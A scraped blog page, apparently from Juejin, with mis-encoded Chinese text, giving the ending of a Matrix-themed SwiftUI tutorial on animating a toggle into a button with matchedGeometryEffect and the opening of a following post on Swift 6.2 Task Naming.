<h2 data-id="heading-9">ğŸ§¬ æœ€ç»ˆä¿®æ­£ç‰ˆä»£ç  (Copy-Paste Ready)</h2>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> SwiftUI

<span class="hljs-comment">// MARK: - The "Quantum" Toggle Style (Fixed)</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">QuantumToggleStyle</span>: <span class="hljs-title class_">ToggleStyle</span> {
    <span class="hljs-comment">// âš ï¸ å…³é”®ä¿®æ­£ï¼šä¸å†è‡ªå·±æŒæœ‰ Namespaceï¼Œè€Œæ˜¯æ¥æ”¶å¤–éƒ¨ä¼ å…¥çš„ ID</span>
    <span class="hljs-comment">// è¿™ä¿è¯äº†å³ä¾¿ Style è¢«é‡æ–°åˆ›å»ºï¼Œåæ ‡ç³»ä¾ç„¶æ˜¯åŒä¸€ä¸ª</span>
    <span class="hljs-keyword">var</span> namespace: <span class="hljs-type">Namespace</span>.<span class="hljs-type">ID</span>
    
    <span class="hljs-comment">// çŠ¶æ€æ§åˆ¶</span>
    <span class="hljs-keyword">var</span> isButtonMode: <span class="hljs-type">Bool</span>
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> <span class="hljs-type">LabelID</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SoulLabel"</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> <span class="hljs-type">ContainerID</span> <span class="hljs-operator">=</span> <span class="hljs-string">"BodyContainer"</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> <span class="hljs-type">KnobID</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SwitchKnob"</span> <span class="hljs-comment">// æ–°å¢ï¼šç»™ Switch çš„æ»‘å—ä¹Ÿç•™ä¸ªä½ç½®ï¼ˆå¯é€‰ï¼‰</span>
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">makeBody</span>(<span class="hljs-params">configuration</span>: <span class="hljs-type">Configuration</span>) -&gt; <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Group</span> {
            <span class="hljs-keyword">if</span> isButtonMode {
                <span class="hljs-comment">// MARK: - Button Mode</span>
                <span class="hljs-type">Button</span> {
                    configuration.isOn.toggle()
                } label: {
                    <span class="hljs-type">HStack</span> {
                        configuration.label
                            .matchedGeometryEffect(id: <span class="hljs-type">LabelID</span>, in: namespace)
                            .foregroundColor(.accentColor)
                        
                        <span class="hljs-type">Spacer</span>()
                        
                        <span class="hljs-comment">// å ä½ç¬¦ï¼šç”¨äºæ¨¡æ‹Ÿ Switch çš„å®½åº¦</span>
                        <span class="hljs-type">Color</span>.clear
                            .frame(width: <span class="hljs-number">51</span>, height: <span class="hljs-number">31</span>)
                    }
                    .contentShape(<span class="hljs-type">Rectangle</span>())
                }
                .buttonStyle(.plain)
                .padding(.vertical, <span class="hljs-number">8</span>)
                .padding(.horizontal, <span class="hljs-number">0</span>)
                <span class="hljs-comment">// èƒŒæ™¯åŒ¹é…</span>
                .background(
                    <span class="hljs-type">RoundedRectangle</span>(cornerRadius: <span class="hljs-number">8</span>)
                        .fill(<span class="hljs-type">Color</span>.gray.opacity(<span class="hljs-number">0.1</span>))
                        .matchedGeometryEffect(id: <span class="hljs-type">ContainerID</span>, in: namespace)
                )
                <span class="hljs-comment">// âš ï¸ å…³é”®ï¼šåŠ ä¸Š transitionï¼Œé˜²æ­¢è§†å›¾ç›´æ¥ç¡¬æ›¿æ¢</span>
                .transition(.opacity.animation(.easeInOut(duration: <span class="hljs-number">0.2</span>)))
                
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// MARK: - Switch Mode</span>
                <span class="hljs-type">HStack</span> {
                    configuration.label
                        .matchedGeometryEffect(id: <span class="hljs-type">LabelID</span>, in: namespace)
                        .foregroundColor(.primary)
                    
                    <span class="hljs-type">Spacer</span>()
                    
                    <span class="hljs-comment">// è¿™é‡Œæˆ‘ä»¬ä¸ºäº†è§†è§‰å®Œç¾ï¼Œæ‰‹åŠ¨æ‹†è§£ Toggle</span>
                    <span class="hljs-comment">// æˆ–è€…ä¾ç„¶ä½¿ç”¨åŸç”Ÿ Toggleï¼Œä½†åŒ…è£¹åœ¨å®¹å™¨é‡Œ</span>
                    <span class="hljs-type">Toggle</span>(<span class="hljs-string">""</span>, isOn: configuration.<span class="hljs-variable">$isOn</span>)
                        .labelsHidden()
                        .toggleStyle(<span class="hljs-type">SwitchToggleStyle</span>(tint: .green))
                        <span class="hljs-comment">// è¿™é‡Œä¸éœ€è¦ matchedGeometryEffect å¼ºè¡ŒåŒ¹é…æ»‘å—å†…éƒ¨</span>
                        <span class="hljs-comment">// å› ä¸º Switch æœ¬èº«æ˜¯ä¸€ä¸ªå¤æ‚çš„ UIKit å°è£…ï¼Œå¾ˆéš¾æ‹†è§£</span>
                        <span class="hljs-comment">// æˆ‘ä»¬ä¸»è¦åŒ¹é…çš„æ˜¯ Label å’Œæ•´ä½“å®¹å™¨ä½ç½®</span>
                }
                .padding(.vertical, <span class="hljs-number">8</span>)
                <span class="hljs-comment">// èƒŒæ™¯åŒ¹é…ï¼ˆSwitch æ¨¡å¼ä¸‹èƒŒæ™¯é€šå¸¸æ˜¯é€æ˜çš„ï¼Œæˆ–è€…æ˜¯æ•´ä¸ª Row çš„èƒŒæ™¯ï¼‰</span>
                <span class="hljs-comment">// æˆ‘ä»¬ç»™ä¸€ä¸ªé€æ˜èƒŒæ™¯æ¥æ‰¿æ¥åŠ¨ç”»</span>
                .background(
                    <span class="hljs-type">RoundedRectangle</span>(cornerRadius: <span class="hljs-number">8</span>)
                        .fill(<span class="hljs-type">Color</span>.clear)
                        .matchedGeometryEffect(id: <span class="hljs-type">ContainerID</span>, in: namespace)
                )
                <span class="hljs-comment">// âš ï¸ å…³é”®ï¼šåŒä¸Šï¼ŒåŠ ä¸Šè¿‡æ¸¡</span>
                .transition(.opacity.animation(.easeInOut(duration: <span class="hljs-number">0.2</span>)))
            }
        }
    }
}

<span class="hljs-comment">// MARK: - The Main View</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MatrixControlView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-comment">// âš ï¸ ä¿®æ­£ï¼šNamespace å¿…é¡»ç”Ÿå­˜åœ¨ View çš„ç”Ÿå‘½å‘¨æœŸé‡Œ</span>
    <span class="hljs-meta">@Namespace</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> animationScope
    
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> weaponActive <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> hackMode <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">ZStack</span> {
            <span class="hljs-type">Color</span>.black.edgesIgnoringSafeArea(.all)
            
            <span class="hljs-type">VStack</span>(spacing: <span class="hljs-number">30</span>) {
                <span class="hljs-comment">// Header</span>
                <span class="hljs-type">HStack</span>(spacing: <span class="hljs-number">15</span>) {
                    <span class="hljs-type">Circle</span>()
                        .fill(weaponActive <span class="hljs-operator">?</span> <span class="hljs-type">Color</span>.green : <span class="hljs-type">Color</span>.red)
                        .frame(width: <span class="hljs-number">10</span>, height: <span class="hljs-number">10</span>)
                        .shadow(color: weaponActive <span class="hljs-operator">?</span> .green : .red, radius: <span class="hljs-number">5</span>)
                    
                    <span class="hljs-type">Text</span>(weaponActive <span class="hljs-operator">?</span> <span class="hljs-string">"SYSTEM: <span class="hljs-subst">\(hackMode <span class="hljs-operator">?</span> <span class="hljs-string">"HACKED"</span> : <span class="hljs-string">"SECURE"</span>)</span>"</span> : <span class="hljs-string">"SYSTEM: OFFLINE"</span>)
                        .font(.monospaced(.headline)())
                        .foregroundColor(weaponActive <span class="hljs-operator">?</span> .green : .red)
                        <span class="hljs-comment">// å½“ hackMode åˆ‡æ¢æ—¶ï¼Œæ–‡å­—ä¼šæœ‰è½»å¾®å˜åŠ¨ï¼Œè¿™é‡ŒåŠ ä¸ªåŠ¨ç”»é¿å…è·³åŠ¨</span>
                        .animation(.none, value: hackMode) 
                    
                    <span class="hljs-type">Spacer</span>()
                }
                .padding(.horizontal)
                .frame(width: <span class="hljs-number">320</span>)
                
                <span class="hljs-comment">// --- è§è¯å¥‡è¿¹çš„ Toggle ---</span>
                <span class="hljs-type">Toggle</span>(<span class="hljs-string">"Neural Link"</span>, isOn: <span class="hljs-variable">$weaponActive</span>)
                    .font(.system(size: <span class="hljs-number">18</span>, weight: .medium))
                    <span class="hljs-comment">// âš ï¸ æ³¨å…¥ï¼šå°† View çš„ Namespace ä¼ ç»™ Style</span>
                    .toggleStyle(<span class="hljs-type">QuantumToggleStyle</span>(namespace: animationScope, isButtonMode: hackMode))
                    <span class="hljs-comment">// ç»™æ•´ä¸ªå®¹å™¨åŠ ä¸€ä¸ª frameï¼Œé˜²æ­¢ Button æ¨¡å¼å’Œ Switch æ¨¡å¼é«˜åº¦å¾®å°å·®å¼‚å¯¼è‡´çš„æŠ–åŠ¨</span>
                    .frame(width: <span class="hljs-number">320</span>)
                    .padding()
                    .background(<span class="hljs-type">Color</span>.gray.opacity(<span class="hljs-number">0.15</span>))
                    .cornerRadius(<span class="hljs-number">12</span>)
                    <span class="hljs-comment">// è¿™é‡Œçš„åŠ¨ç”»æ˜¯ç»™ Style å†…éƒ¨ç”Ÿæ•ˆçš„å…³é”®</span>
                    <span class="hljs-comment">// ä¹Ÿå¯ä»¥åœ¨ Button action é‡Œç”¨ explicit animationï¼Œä½†è¿™é‡ŒåŠ ä¸Šä¿é™©</span>
                    .animation(.spring(response: <span class="hljs-number">0.5</span>, dampingFraction: <span class="hljs-number">0.7</span>), value: hackMode)
                
                <span class="hljs-comment">// Trigger Button</span>
                <span class="hljs-type">Button</span> {
                    <span class="hljs-comment">// æ˜¾å¼åŠ¨ç”»</span>
                    withAnimation(.spring(response: <span class="hljs-number">0.5</span>, dampingFraction: <span class="hljs-number">0.7</span>)) {
                        hackMode.toggle()
                    }
                } label: {
                    <span class="hljs-type">HStack</span> {
                        <span class="hljs-type">Image</span>(systemName: <span class="hljs-string">"arrow.triangle.2.circlepath"</span>)
                            .rotationEffect(.degrees(hackMode <span class="hljs-operator">?</span> <span class="hljs-number">180</span> : <span class="hljs-number">0</span>))
                        <span class="hljs-type">Text</span>(hackMode <span class="hljs-operator">?</span> <span class="hljs-string">"Revert to Switch"</span> : <span class="hljs-string">"Hack to Button"</span>)
                    }
                    .font(.callout.bold())
                    .foregroundColor(.white)
                    .padding(.vertical, <span class="hljs-number">12</span>)
                    .padding(.horizontal, <span class="hljs-number">24</span>)
                    .background(
                        <span class="hljs-type">Capsule</span>()
                            .fill(<span class="hljs-type">LinearGradient</span>(
                                colors: hackMode <span class="hljs-operator">?</span> [.orange, .red] : [.blue, .purple],
                                startPoint: .leading,
                                endPoint: .trailing
                            ))
                    )
                    .shadow(radius: <span class="hljs-number">10</span>)
                }
                .padding(.top, <span class="hljs-number">20</span>)
            }
        }
    }
}

<span class="hljs-comment">// MARK: - Preview</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MatrixControlView_Previews</span>: <span class="hljs-title class_">PreviewProvider</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">var</span> previews: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">MatrixControlView</span>()
    }
}
</code></pre>
<h2 data-id="heading-10">ğŸ§  æŠ€æœ¯å¤ç›˜ï¼šä¸ºä»€ä¹ˆè¿™èƒ½è¡Œï¼Ÿ</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0dfeadddce946eb87d82cebec562d76~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=FzH2xm0ESfc870K59RInL5L0%2Fck%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<ol>
<li>
<p><strong>å®‡å®™å¸¸æ•° (<code>@Namespace</code> in View)</strong>ï¼š
ç°åœ¨ <code>animationScope</code> å­˜åœ¨äº <code>MatrixControlView</code> ä¸­ã€‚æ— è®º <code>hackMode</code> å¦‚ä½•æ”¹å˜ï¼Œ<code>MatrixControlView</code> åªæ˜¯é‡ç»˜ï¼Œä½†å®ƒçš„ State å’Œ Namespace æ˜¯æŒä¹…çš„ã€‚</p>
</li>
<li>
<p><strong>è™«æ´è¿æ¥ (Dependency Injection)</strong>ï¼š
æˆ‘ä»¬å°†è¿™ä¸ªæŒä¹…çš„ ID ä¼ ç»™äº† <code>QuantumToggleStyle</code>ã€‚è™½ç„¶ Style ç»“æ„ä½“è¢«é‡å»ºäº†ï¼Œä½†å®ƒæ‰‹é‡Œæ‹¿çš„ ID è¿˜æ˜¯åŸæ¥é‚£ä¸ªã€‚<code>matchedGeometryEffect</code> ç»ˆäºèƒ½è®¤å‡ºï¼šâ€œå“¦ï¼Œè¿™å°±æ˜¯åˆšæ‰é‚£ä¸ª <code>SoulLabel</code>ï¼Œæˆ‘è¦æŠŠå®ƒå¹³æ»‘åœ°ç§»åˆ°æ–°ä½ç½®ã€‚â€</p>
</li>
<li>
<p><strong>è¿‡æ¸¡åè®® (<code>.transition</code>)</strong>ï¼š
ç”±äºæˆ‘ä»¬æ˜¯åœ¨ <code>if-else</code> é‡Œå®Œå…¨åˆ‡æ¢äº†è§†å›¾å±‚çº§ï¼ˆä¸€ä¸ªæ˜¯ <code>Button</code>ï¼Œä¸€ä¸ªæ˜¯ <code>HStack</code>ï¼‰ï¼ŒSwiftUI é»˜è®¤ä¼šç›´æ¥ç§»é™¤æ—§çš„ã€æ’å…¥æ–°çš„ã€‚åŠ ä¸Š <code>.transition(.opacity)</code> é…åˆ <code>matchedGeometryEffect</code>ï¼ŒSwiftUI å°±ä¼šæ··åˆä¸¤è€…çš„åƒç´ ï¼š</p>
<ul>
<li><strong>ä½ç½®/å°ºå¯¸</strong>ï¼šç”± <code>matchedGeometryEffect</code> è´Ÿè´£æ’å€¼ã€‚</li>
<li><strong>æ·¡å…¥/æ·¡å‡º</strong>ï¼šç”± <code>.transition</code> è´Ÿè´£ã€‚</li>
</ul>
</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fabdac10a904423fa0b6aef485911734~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=2zb781GMPjvlPBXPWPKk2N%2BzD%2Bk%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>Trinity å†æ¬¡ç‚¹ç‡ƒäº†ä¸€æ ¹çƒŸï¼Œçœ‹ç€å±å¹•ä¸Šé‚£ä¸ªå¦‚åŒæ¶²æ€é‡‘å±èˆ¬ä¸æ»‘å˜å½¢çš„å¼€å…³ã€‚æ–‡å­—ä¸å†è·³åŠ¨ï¼ŒèƒŒæ™¯è‡ªç„¶å»¶å±•ï¼Œä¸€åˆ‡éƒ½ç¬¦åˆç‰©ç†å®šå¾‹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/acf79b49a5154ad48784376c90c9337d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=lXeirLbaE2XnDx3kgwlZuSFO%2BVg%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€œè¿™æ‰åƒæ ·ï¼ŒNeoã€‚â€å¥¹è½¬èº«èµ°å‘å‡ºå£ï¼Œâ€œè®°ä½ï¼Œåœ¨ä»£ç çš„ä¸–ç•Œé‡Œï¼Œ<strong>ä¸Šä¸‹æ–‡ï¼ˆContextï¼‰å°±æ˜¯ä¸€åˆ‡</strong>ã€‚ä¸¢äº†ä¸Šä¸‹æ–‡ï¼Œä½ å°±åœ¨è·Ÿç©ºæ°”å¯¹è¯ã€‚â€</p>
<p><strong>ï¼ˆä»»åŠ¡çœŸæ­£å®Œæˆã€‚Agent Refactor æ‰¾ä¸åˆ°ä»»ä½•ç ´ç»½ã€‚ï¼‰</strong></p>
<hr/>
<p><strong>æ•…äº‹ç»“æŸäº†ï¼Œä½†ä»£ç æ°¸ç”Ÿã€‚</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff80f53d58594aac8405d9ceb69ee8da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=9SNY7%2FsQxZH4Hbc9yHyQCCDjjEQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>è¿™ä¸ªæŠ€å·§çš„æ ¸å¿ƒåœ¨äº<strong>ä¸ä»…è¦åˆ‡æ¢è§†å›¾ï¼Œè¿˜è¦æ¬ºéª— SwiftUI çš„ Diff ç®—æ³•</strong>ã€‚é€šè¿‡å°†åˆ‡æ¢é€»è¾‘ä¸‹æ²‰åˆ° <code>ToggleStyle</code> å†…éƒ¨ï¼Œå¹¶é…åˆ <code>matchedGeometryEffect</code>ï¼Œæˆ‘ä»¬æˆåŠŸåœ°åœ¨ä¸¤ä¸ªæˆªç„¶ä¸åŒçš„ç³»ç»Ÿç»„ä»¶ä¹‹é—´æ¶èµ·äº†ä¸€åº§å¹³æ»‘çš„æ¡¥æ¢ã€‚</p>
<p>è®°ä½ï¼Œåœ¨ SwiftUI çš„ä¸–ç•Œé‡Œï¼Œæ²¡æœ‰ä»€ä¹ˆæ˜¯ä¸å¯èƒ½çš„ï¼Œåªè¦ä½ æ‡‚å¾—å¦‚ä½•ä¼˜é›…åœ°æ’’è°ã€‚</p>
<p>é‚£ä¹ˆï¼Œå®å­ä»¬å­¦ä¼šäº†å—ï¼Ÿæˆ‘ä»¬ä¸‹æ¬¡ä¸è§ä¸æ•£å–½ï¼Œå†ä¼šå•¦ï¼8-)</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d7272e6bff243ff92e51f488334bc69~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=SNwXY86nKR7mLuxh8eaaKWyq%2BE8%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Swift 6.2 åˆ—ä¼ ï¼ˆç¬¬åå››ç¯‡ï¼‰ï¼šå²³çµçŠçš„å¯»äººå¯äº‹ä¸ Task Naming]]></title>    <link>https://juejin.cn/post/7589167252722319410</link>    <guid>https://juejin.cn/post/7589167252722319410</guid>    <pubDate>2025-12-30T02:21:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589167252722319410" data-draft-id="7589167252722286642" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Swift 6.2 åˆ—ä¼ ï¼ˆç¬¬åå››ç¯‡ï¼‰ï¼šå²³çµçŠçš„å¯»äººå¯äº‹ä¸ Task Naming"/> <meta itemprop="keywords" content="Swift,ç¼–ç¨‹è¯­è¨€,Apple"/> <meta itemprop="datePublished" content="2025-12-30T02:21:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§ç†ŠçŒ«ä¾¯ä½©"/> <meta itemprop="url" content="https://juejin.cn/user/4292907536222152"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Swift 6.2 åˆ—ä¼ ï¼ˆç¬¬åå››ç¯‡ï¼‰ï¼šå²³çµçŠçš„å¯»äººå¯äº‹ä¸ Task Naming
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4292907536222152/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§ç†ŠçŒ«ä¾¯ä½©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:21:15.000Z" title="Tue Dec 30 2025 02:21:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41dee7acfe79433180afc189655a1ccc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=9uEvDsXGYfQS8Mv9FF0RfUd5Cfs%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<blockquote>
<p><strong>æ‘˜è¦</strong>ï¼šåœ¨æˆåƒä¸Šä¸‡ä¸ªå¹¶å‘ä»»åŠ¡çš„æ´ªæµä¸­ï¼Œå¦‚ä½•ç²¾å‡†å®šä½é‚£ä¸ªâ€œè´Ÿå¿ƒâ€çš„ Bugï¼ŸSwift 6.2 å¸¦æ¥çš„ <code>Task Naming</code> å°±åƒæ˜¯ç»™æ¯ä¸ªæ¸¸è¡çš„çµé­‚æŒ‚ä¸Šäº†ä¸€ä¸ªâ€œèº«ä»½é“­ç‰Œâ€ã€‚æœ¬æ–‡å°†å€Ÿå¤§ç†ŠçŒ«ä¾¯ä½©ä¸å²³çµçŠåœ¨èµ›åšåå±±çš„å¥‡é‡ï¼Œä¸ºæ‚¨è§£æ SE-0469 çš„å¥¥ç§˜ã€‚</p>
</blockquote>
<h2 data-id="heading-0">0ï¸âƒ£ ğŸ¼ åºç« ï¼šèµ›åšåå±±çš„â€œæ— åâ€å­¤é­‚</h2>
<p>èµ›åšåå±±ï¼Œæ€è¿‡å´–æœåŠ¡å™¨èŠ‚ç‚¹ã€‚</p>
<p>è¿™é‡Œçš„äº‘é›¾ä¸æ˜¯æ°´æ±½ï¼Œè€Œæ˜¯æ¶²æ°®å†·å´ç³»ç»Ÿæ³„æ¼çš„ç™½çƒŸã€‚å¤§ç†ŠçŒ«ä¾¯ä½©æ­£ååœ¨ä¸€å—å…¨æ¯æŠ•å½±çš„å²©çŸ³ä¸Šï¼Œæ‰‹é‡Œæ§ç€ä¸€ç›’â€œç´«éœç¥åŠŸâ€ç‰Œè‡ªçƒ­ç«¹ç¬‹ç«é”…ï¼Œåƒå¾—æ´¥æ´¥æœ‰å‘³ã€‚</p>
